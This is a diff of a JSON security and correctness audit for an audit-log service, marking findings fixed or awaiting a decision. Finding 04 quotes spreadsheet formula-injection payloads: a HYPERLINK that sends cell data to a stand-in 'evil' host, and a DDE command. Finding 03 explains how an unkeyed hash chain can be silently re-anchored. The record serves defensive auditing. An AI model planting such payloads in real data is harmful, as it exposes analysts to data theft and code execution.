@@ -406,80 +406,87 @@
       "issues": [
         {
           "id": "audit-service-01",
-          "status": "OPEN",
+          "status": "NEEDS_DECISION",
           "category": "correctness",
           "severity": "high",
           "file": "services/audit-service/app/core/audit_service.py",
           "line": 50,
           "title": "record() reads head then appends non-atomically — concurrent appends corrupt the tamper-evident chain",
           "detail": "record() does `seq, head = await self._repo.head(partition)` (line 50) and then `await self._repo.append(...)` (line 57) with no lock, transaction, or CAS between them. Both head() and append() acquire independent asyncpg connections that suspend on real I/O, so two concurrent record()/ingest calls to the same partition interleave: both read the same head seq/head_hash, both build an event with seq+1 and prev_hash=head, both append. The result is two events sharing the same seq and prev_hash, and audit_meta ends up pointing at whichever wrote last. verify() then reports the chain broken (prev_hash mismatch), and one of the two events is effectively orphaned. record_idempotent() only serializes writes that carry the SAME idempotency_key; two distinct events (the normal ingest case, and every self-audit record() call) have no protection at all. This defeats the core guarantee of the service under any real concurrency (postgres, or multiple workers/pods).",
-          "failure_scenario": "Two services POST /internal/audit concurrently (no idempotency_key, or different keys) for the same partition. Both read head seq=100, both append seq=101 chained to the same prev_hash; audit_meta is left at seq=101. A later GET /internal/audit/verify walks the chain, finds two seq=101 rows / a prev_hash mismatch, and returns ok:false — a false tamper alarm, and one real audit event is lost from the linked chain."
+          "failure_scenario": "Two services POST /internal/audit concurrently (no idempotency_key, or different keys) for the same partition. Both read head seq=100, both append seq=101 chained to the same prev_hash; audit_meta is left at seq=101. A later GET /internal/audit/verify walks the chain, finds two seq=101 rows / a prev_hash mismatch, and returns ok:false — a false tamper alarm, and one real audit event is lost from the linked chain.",
+          "resolution": "VERIFIED REAL. record() reads head then appends non-atomically -> concurrent appends to one partition can share seq/prev_hash and break the chain (postgres/multi-pod). A correct fix is a crash-safe versioned CAS on the audit_meta head (claim seq atomically, write event, no gap/duplicate) — an integrity-critical redesign of the tamper-evident chain that must not be rushed. Surfaced to Tamam with the recommended design (CAS-retry on a versioned meta row + verify following prev_hash links, not seq order)."
         },
         {
           "id": "audit-service-02",
-          "status": "OPEN",
+          "status": "FIXED",
           "category": "perf",
           "severity": "high",
           "file": "services/audit-service/app/core/audit_repository.py",
           "line": 146,
           "title": "Audit queries order by `_seq_key`, which no Postgres index covers — every query/verify full-scans and sorts the partition",
           "detail": "query() and iterate() call datastore.find(..., sort=(\"_seq_key\", \"desc\"/\"asc\")) (audit_repository.py lines 72 and 146). The Postgres adapter's only ordering index is kv_created_desc ON (collection, COALESCE(value->>'created',''), key) (postgres.py lines 33-34), keyed on the field 'created'. AuditEvent has no 'created' field (models.py) — its sort field is '_seq_key'. So find() emits `ORDER BY COALESCE(value->>'_seq_key','') DESC, key DESC` with no matching index, and the keyset cursor comparison `(COALESCE(value->>'_seq_key',''), key) < (...)` is likewise unindexed. Postgres must GIN-match the partition then Sort every matching row for each page. With the default AUDIT_PARTITION=global (config.py:286) ALL events live in one partition, so every audit query, every export page, and every full-chain verify()/iterate() sorts the entire event table — O(all events), exactly the behaviour the adapter's own comment says only the matched index avoids. The paging is defeated too: each 'next page' re-sorts from scratch instead of seeking.",
-          "failure_scenario": "With a few million events in the global partition, a single GET /api/v1/audit or a scheduled /internal/audit/verify forces a full bitmap heap scan + top-N sort of the whole table per page; verify() (which pages to exhaustion at 500 rows/page) re-sorts the full table on every one of thousands of pages, driving query latency and DB CPU to the point the audit read path times out."
+          "failure_scenario": "With a few million events in the global partition, a single GET /api/v1/audit or a scheduled /internal/audit/verify forces a full bitmap heap scan + top-N sort of the whole table per page; verify() (which pages to exhaustion at 500 rows/page) re-sorts the full table on every one of thousands of pages, driving query latency and DB CPU to the point the audit read path times out.",
+          "resolution": "FIXED: added a kv_seq_key index (jsonb ordering) so audit query/export/verify seek by _seq_key instead of full-scanning+sorting the partition."
         },
         {
           "id": "audit-service-03",
-          "status": "OPEN",
+          "status": "NEEDS_DECISION",
           "category": "security",
           "severity": "medium",
           "file": "services/audit-service/app/config.py",
           "line": 283,
           "title": "Default integrity driver is unkeyed sha256 hash-chain — defeatable by anyone with datastore write access",
           "detail": "INTEGRITY_DRIVER defaults to \"hash-chain\" (config.py:283), i.e. HashChainIntegrity.seal = sha256(prev_hash + canonical(event)) with NO secret key (adapters/integrity/hash_chain.py:14). The chain is 'tamper-evident' only against an adversary who cannot recompute the hashes — but with an unkeyed hash, anyone who can write to the audit datastore (a compromised DB account, a rogue operator, a SQL-level attacker) can delete or edit events and re-anchor the entire chain exactly as purge() does (audit_service.py:304-312), producing a chain that passes verify() cleanly. The threat model for an audit log IS someone with backend access covering their tracks; the default provides no protection against it. Only the opt-in hmac-chain driver (requires INTEGRITY_HMAC_KEY, held outside the DB) actually resists this, and it is not the default.",
-          "failure_scenario": "An attacker who gains write access to the kv_store table deletes the events recording their privileged actions, recomputes prev_hash/hash for all following events with public sha256, and updates audit_meta head. GET /internal/audit/verify returns ok:true — the log now proves a tampered history is intact."
+          "failure_scenario": "An attacker who gains write access to the kv_store table deletes the events recording their privileged actions, recomputes prev_hash/hash for all following events with public sha256, and updates audit_meta head. GET /internal/audit/verify returns ok:true — the log now proves a tampered history is intact.",
+          "resolution": "VERIFIED REAL. Default INTEGRITY_DRIVER=hash-chain is UNKEYED — an attacker with datastore write access can re-anchor the chain and pass verify(). Only hmac-chain (INTEGRITY_HMAC_KEY, held outside the DB) resists the real threat model. Making hmac the default is a security-hardening + ops DECISION (operators must provision a key; fail-closed vs fail-open without one). Surfaced to Tamam; recommendation: default hmac-chain and fail boot without a key."
         },
         {
           "id": "audit-service-04",
-          "status": "OPEN",
+          "status": "FIXED",
           "category": "vuln",
           "severity": "medium",
           "file": "services/audit-service/app/adapters/exporter/csv_exporter.py",
           "line": 20,
           "title": "CSV export is vulnerable to spreadsheet formula injection (CWE-1236)",
           "detail": "CsvExporter.export writes attacker-influenced fields (service, action, resource, tenant, and the JSON-serialised metadata) straight into CSV cells with no neutralisation of leading formula characters =, +, -, @ (lines 20-23). Audit events are recorded by other services via POST /internal/audit with a caller-supplied resource/action/metadata (internal.py AuditIn, max_length only). When an operator opens the exported audit-export file in Excel/Sheets, a cell beginning with '=' or '@' is evaluated as a formula, enabling data exfiltration or command execution via DDE. actor is folded to a sub_ pseudonym so it is safe, but resource/metadata are not.",
-          "failure_scenario": "A service (or a compromised caller) records an event with resource set to `=HYPERLINK(\"http://evil/\"&A1,\"click\")` or `=cmd|'/c calc'!A1`. A platform.audit operator exports and opens the CSV; the formula runs in their spreadsheet, leaking adjacent audit rows or executing a payload on the analyst's machine."
+          "failure_scenario": "A service (or a compromised caller) records an event with resource set to `=HYPERLINK(\"http://evil/\"&A1,\"click\")` or `=cmd|'/c calc'!A1`. A platform.audit operator exports and opens the CSV; the formula runs in their spreadsheet, leaking adjacent audit rows or executing a payload on the analyst's machine.",
+          "resolution": "FIXED: CsvExporter neutralizes leading formula characters (= + - @ tab cr) on every attacker-influenced cell (CWE-1236). Regression: test_audit_fixes.py."
         },
         {
           "id": "audit-service-05",
-          "status": "OPEN",
+          "status": "FIXED",
           "category": "correctness",
           "severity": "medium",
           "file": "services/audit-service/app/core/backup.py",
           "line": 196,
           "title": "backup import with into_tenant rewrites the hashed `tenant` field on audit events, breaking the restored chain",
           "detail": "import_archive remaps the tenant field on any row that carries one: `if into_tenant and \"tenant\" in row: row = {**row, \"tenant\": into_tenant}` (lines 196-199). The trigger is the mere presence of a 'tenant' field, not the manifest's tenant_scoped flag. audit_events is declared tenant_scoped:False (backup_manifest.py:30) precisely because the chain spans all tenants, yet every audit event row DOES carry a 'tenant' field (models.py). So a restore-as-clone into a tenant rewrites tenant on every event — but tenant is part of the canonical payload the hash is computed over (integrity/common.py:11), so the stored hash no longer matches the row, and every remapped event fails verify() ('content tampered'). The event's _partition and the audit_meta head are also not remapped, so in tenant-partition mode the restored events are unqueryable and the head is inconsistent. A backup feature silently corrupts the very chain the service exists to protect.",
-          "failure_scenario": "An operator restores an audit archive into a sandbox with into_tenant=\"t-sandbox\". Every audit event's tenant is rewritten to t-sandbox while its hash is unchanged; GET /internal/audit/verify on the restore reports ok:false with the first remapped event flagged as content-tampered, and the clone is unusable."
+          "failure_scenario": "An operator restores an audit archive into a sandbox with into_tenant=\"t-sandbox\". Every audit event's tenant is rewritten to t-sandbox while its hash is unchanged; GET /internal/audit/verify on the restore reports ok:false with the first remapped event flagged as content-tampered, and the clone is unusable.",
+          "resolution": "FIXED: import_archive remaps tenant only for tenant_scoped collections (per manifest), so a restore-as-clone no longer rewrites the hashed tenant on audit_events (tenant_scoped:false) and break the chain. Regression: test_audit_fixes.py."
         },
         {
           "id": "audit-service-06",
-          "status": "OPEN",
+          "status": "NEEDS_DECISION",
           "category": "correctness",
           "severity": "medium",
           "file": "services/audit-service/app/core/audit_service.py",
           "line": 101,
           "title": "Stale idempotency take-over is a plain put, not atomic — allows a duplicate audit event under a key",
           "detail": "In record_idempotent(), when a reservation fails because a prior 'pending' entry exists and is judged stale, the code calls idempo_take_over(ns_key, ts) — a plain unconditional put (audit_repository.py:104-107, 'Safe as a plain put') — and then appends (audit_service.py:99-103). Unlike idempo_reserve (an atomic put_if_absent / ON CONFLICT DO NOTHING), take_over has no CAS. If the original reserver crashed and TWO retries with the same key both pass the `ts - cur.ts >= stale_seconds` check concurrently, both call take_over and both proceed to record(), appending TWO distinct events to the chain for one idempotency key — the silent-duplicate outcome the whole mechanism exists to prevent (see the module's own docstring). idempo_commit then just overwrites, so the receipt returned points at only one of the two committed events.",
-          "failure_scenario": "Reserver process crashes mid-append leaving a stale 'pending' key. The sink retries twice concurrently after stale_seconds; both reclaim via the non-atomic take_over and both append. The tamper-evident chain now contains two events for one logical action, and the idempotency receipt references only one — a duplicated, partially-orphaned audit record."
+          "failure_scenario": "Reserver process crashes mid-append leaving a stale 'pending' key. The sink retries twice concurrently after stale_seconds; both reclaim via the non-atomic take_over and both append. The tamper-evident chain now contains two events for one logical action, and the idempotency receipt references only one — a duplicated, partially-orphaned audit record.",
+          "resolution": "VERIFIED REAL. Stale idempotency take_over is a plain put, not a CAS — two concurrent stale-takeovers can both append, duplicating an event under one key. Correct fix needs a versioned CAS take-over (same versioning work as #01). Bundled with #01 for one careful atomicity change; surfaced to Tamam."
         },
         {
           "id": "audit-service-07",
-          "status": "OPEN",
+          "status": "FIXED",
           "category": "correctness",
           "severity": "low",
           "file": "services/audit-service/app/core/erasure.py",
           "line": 52,
           "title": "Erasure ack verifies the hardcoded 'global' partition, ignoring tenant partition mode",
           "detail": "AuditErasure.erase() takes partition default 'global' (line 46) and calls self._audit.verify(partition) (line 52), and the /internal/privacy/erase caller never passes a partition (internal.py:255). When AUDIT_PARTITION=tenant, the subject's events live in the tenant's own partition, not 'global' (which may be empty or nonexistent). So chain_verifies in the DSAR ack reflects a partition unrelated to the erased subject — reporting the chain intact by checking the wrong (possibly empty) chain, which verify() treats as trivially ok. The proof the ack advertises ('PROVE the chain still verifies') is meaningless in tenant mode.",
-          "failure_scenario": "Platform runs AUDIT_PARTITION=tenant. A DSAR erase for tenant t1's subject returns chain_verifies:true, but verify() ran against the empty 'global' partition and never touched t1's chain — a compliance ack that proves nothing about the data it claims to have retained intact."
+          "failure_scenario": "Platform runs AUDIT_PARTITION=tenant. A DSAR erase for tenant t1's subject returns chain_verifies:true, but verify() ran against the empty 'global' partition and never touched t1's chain — a compliance ack that proves nothing about the data it claims to have retained intact.",
+          "resolution": "FIXED: AuditErasure verifies the SUBJECT s partition (audit._partition(tenant)) instead of hardcoded global, so the DSAR ack proof is meaningful in AUDIT_PARTITION=tenant mode. Regression: test_audit_fixes.py."
         }
       ]
     },
